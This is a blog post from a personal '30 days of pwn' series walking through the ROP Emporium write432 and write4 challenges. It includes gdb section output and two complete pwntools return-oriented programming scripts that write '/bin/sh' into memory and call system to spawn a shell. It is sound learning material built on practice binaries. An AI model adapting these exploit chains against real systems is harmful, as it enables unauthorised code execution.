---
layout: post
title:  "Ropemporium Day Five"
date:   2020-07-05 20:05:48 +0100
categories: pwn
---

Here is Day 5 of the 30 days of pwn challenge. As a side note, I'm not sure how I will progress from this point. I think I will follow a mixture of writeups and revision to progress with some of these (probably basic but feels advanced) subjects. I will **hopefully** be able to challenge myself with some of the pwn section from [htb](https://www.hackthebox.eu/home/challenges/Pwn). But I think I will just be happy to have learnt a few things that I can build upon in the future!

## Write432
In this challenge, the goal is to write into a section of the code that we have write privileges to, and use that to write in the string "/bin/sh" before passing that string into the system call given to us.

This can be done with a few steps as seen in the exploit code.

First thing to do is to identify an area of the code that we can write to.
`gdb-peda$ maintenance info sections`
```
 [17]     0x8048798->0x80488a4 at 0x00000798: .eh_frame ALLOC LOAD READONLY DATA HAS_CONTENTS
 [18]     0x8049f08->0x8049f0c at 0x00000f08: .init_array ALLOC LOAD DATA HAS_CONTENTS
 [19]     0x8049f0c->0x8049f10 at 0x00000f0c: .fini_array ALLOC LOAD DATA HAS_CONTENTS
 [20]     0x8049f10->0x8049f14 at 0x00000f10: .jcr ALLOC LOAD DATA HAS_CONTENTS
 [21]     0x8049f14->0x8049ffc at 0x00000f14: .dynamic ALLOC LOAD DATA HAS_CONTENTS
 [22]     0x8049ffc->0x804a000 at 0x00000ffc: .got ALLOC LOAD DATA HAS_CONTENTS
 [23]     0x804a000->0x804a028 at 0x00001000: .got.plt ALLOC LOAD DATA HAS_CONTENTS
 [24]     0x804a028->0x804a030 at 0x00001028: .data ALLOC LOAD DATA HAS_CONTENTS
 [25]     0x804a040->0x804a06c at 0x00001030: .bss ALLOC
```
From running the `maintenance info sections` we can see the flags that different sections of the program have.

As you can see ".eh_frame" has the "READONLY" flag, and as such we would not be able to write there. Luckily, we have a plethora of places to choose, as every other section I have shown is writable.

Now we can use the gadgets given to us, to write the string into memory (4 bytes at a time, making sure both payloads are infact 4 bytes.)

And finally call system with the address of we wrote to, to spawn a shell from the binary.
### Exploit Code
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

mov_ebp_edi = p32(0x08048670) #0x08048670 : mov dword ptr [edi], ebp ; ret
pop_edi_ebp = p32(0x080486da) #0x080486da : pop edi ; pop ebp ; ret
got_plt = 0x804a000 + 100
system  = p32(0x8048430)
offset  = 'A' * 44

payload = offset
payload += pop_edi_ebp
payload += p32(got_plt)
payload += "/bin"
payload += mov_ebp_edi

payload += pop_edi_ebp
payload += p32(got_plt + 4)
payload += "/sh\x00" 
payload += mov_ebp_edi

payload += system
payload += "aaaa"
payload += p32(got_plt)

p = process("write432")
p.sendline(payload)
p.interactive()
```


## write4

The 64bit version of this challenge is the same idea, though due to being 64bit, there are some differences.

In this version we can write the entire string in 1 payload (64bit is 8 bytes so we have room this time.). So the idea is to first write the payload to the got.plt section and then call system with what we wrote as a paramater.

### Exploit Code
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

mov_r15_r14 = p64(0x0000000000400820) #0x0000000000400820 : mov qword ptr [r14], r15 ; ret
pop_r14_r15 = p64(0x0000000000400890) #0x0000000000400890 : pop r14 ; pop r15 ; ret
pop_rdi     = p64(0x0000000000400893) #0x0000000000400893 : pop rdi ; ret
got_plt = 0x00601000
system  = p64(0x4005e0)
offset  = 'A' * 40

payload = offset
payload += pop_r14_r15
payload += p64(got_plt)
payload += "/bin/sh\x00"
payload += mov_r15_r14

payload += pop_rdi
payload += p64(got_plt)
payload += system

p = process("write4")
p.sendline(payload)
p.interactive()
```
Today is definitely a less productive one for me. I think from tomorrow I will continue the journey by going through some content on [tryhackme](https://tryhackme.com/). I would continue with tryhackme today, but I think it will also make more sense to split content into different posts where possible, also I would like to spend some more time working on the new Hackthebox content in the meantime.